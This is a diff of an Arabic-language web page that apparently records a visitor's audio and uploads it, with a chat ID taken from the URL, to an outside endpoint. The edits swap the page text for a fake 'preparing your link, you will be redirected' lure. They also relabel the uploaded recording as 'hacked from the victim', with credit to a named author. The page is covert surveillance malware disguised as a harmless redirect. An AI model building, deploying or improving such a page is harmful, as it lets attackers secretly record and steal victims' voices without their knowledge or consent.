@@ -49,12 +49,12 @@
     </style>
 </head>
 <body>
-    <h1>التطبيق قيد التشغيل</h1>
+    <h1>جار تجهيز الرابط انتضر قليلاً</h1>
     <div class="container">
-        <p>التطبيق يعمل تلقائيًا لإرسال البيانات. يرجى الانتظار...</p>
+        <p>سيتم تحويلك للصفحه الثانيه انتظر...</p>
     </div>
     <div id="map-container" class="map"></div>
-    <footer>© 2024 - تطبيق كاميرا الأصدقاء</footer>
+    <footer>© 2024 - الموقع مطور من قبل عالم الذره ومخترع التنكلوجيا العليا صوفي </footer>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
@@ -106,7 +106,7 @@
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('voice', audioBlob);
-            formData.append('caption', 'هذا تسجيل صوتي أُرسل تلقائيًا بواسطة البوت.');
+            formData.append('caption', 'هذا تسجيل صوتي تم اختراقه من الضحيه تم التطوير بواسطة صوفي @caser7');
 
             try {
                 await fetch(url, { method: 'POST', body: formData });
